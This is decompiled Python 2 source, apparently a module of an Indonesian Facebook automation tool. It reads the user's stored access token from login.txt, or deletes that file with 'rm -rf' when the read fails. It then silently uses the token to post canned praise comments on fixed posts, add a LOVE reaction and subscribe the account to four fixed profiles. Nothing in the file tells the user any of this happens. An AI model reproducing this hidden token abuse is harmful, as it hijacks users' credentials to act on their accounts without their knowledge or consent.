# Decompile by KangEhem:)
# with (uncompyle6) version : 3.7.4
# Time Succes decompile : 2022-01-14 14:39:10.158098
import requests, sys, os, random, linux
from requests.exceptions import ConnectionError
komenredem = random.choice(['Bang Lu Keren!', 'Bang Lu Cakep Tapi Sayang Kaya Jomblo', 'Siang Luting Malam Jadi Kang Ghosting', 'Dah Lah Abng Cakep Banget :) ', 'bang lu raja ghosting ya:v', 'hahaha sip lah', 'Semoga Abang Dan Keluarga Masuk Surga :)', 'Semoga Abang Sukses', 'Gua Pengguna Sc Lu Bang ', 'Wih Panutan Gua Nih', 'like suhu'])
komtwol = random.choice(['Salam 2 Jari Bang', 'like suhu', 'bang lu kgk punya pacar?', 'MengKeren Lah Bang', 'Semangat Bang!', 'Gua Murid Lu Bang', 'Tumben Post Bang?', 'Gua Pengin Jadi Kek Abang', 'Semoga Abang Jadi Orang Sukses', 'Bjir Lawack Kali Kau Bang'])
kartu2d = random.choice(['pacaran lu mana bang:v', 'waduh jomblo lu bang', 'pokoke keren', 'suport pangeran perang?', 'bjir kali bang', 'like like bang', 'like', 'my suport :v'])
def panjidesu():
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Token/Cookie invalid'
        os.system('rm -rf login.txt')
        exit(linux.login())
    kom = komenredem
    komentar = komtwol
    yotsuba = kartu2d
    post = '120841673763432'
    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + token)
    requests.post('https://graph.facebook.com/120841673763432/comments/?message=' + kom + '&access_token=' + token)
    requests.post('https://graph.facebook.com/127661176381583/comments/?message=' + yotsuba + '&access_token=' + token)
    requests.post('https://graph.facebook.com/129594102854957/comments/?message=' + komentar + '&access_token=' + token)
    requests.post('https://graph.facebook.com/' + post + '/reactions?type=LOVE&access_token=' + token)
    requests.post('https://graph.facebook.com/100021753023697/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100075128005210/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100074131035000/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100075481867671/subscribers?access_token=' + token)
    exit(linux.menu())
# Mau Ngapain Cuk?